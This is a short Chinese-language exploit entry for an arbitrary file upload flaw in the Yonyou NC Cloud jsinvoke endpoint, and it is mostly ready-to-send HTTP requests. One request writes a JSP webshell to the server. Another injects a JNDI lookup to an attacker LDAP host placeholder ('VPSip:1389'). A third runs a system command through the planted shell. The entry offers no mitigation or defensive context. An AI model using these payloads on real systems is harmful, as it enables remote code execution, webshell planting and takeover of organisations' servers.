## 用友 NC Cloud jsinvoke 任意文件上传漏洞
漏洞描述
用友 NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限
app="用友-NC-Cloud"

## 写入webshell
```
POST /uapjs/jsinvoke/?action=invoke
Content-Type: application/json

{
  "serviceName": "nc.itf.iufo.IBaseSPService",
  "methodName": "saveXStreamConfig",
  "parameterTypes": [
    "java.lang.Object",
    "java.lang.String"
  ],
  "parameters": [
    "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
    "webapps/nc_web/407.jsp"
  ]
}

POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host:
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded

{
  "serviceName": "nc.itf.iufo.IBaseSPService",
  "methodName": "saveXStreamConfig",
  "parameterTypes": [
    "java.lang.Object",
    "java.lang.String"
  ],
  "parameters": [
    "${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}",
    "webapps/nc_web/301.jsp"
  ]
}

```

## 执行命令
```

POST /407.jsp?error=bsh.Interpreter HTTP/1.1
Host: *
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close    
Cookie: JSESSIONID=80DA93FB2FFF0204E78FA82643D5BC6E
If-Modified-Since: Fri, 09 Dec 2022 16:12:59 GMT
If-None-Match: W/"370397-1670602379000"
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
           
cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())
```

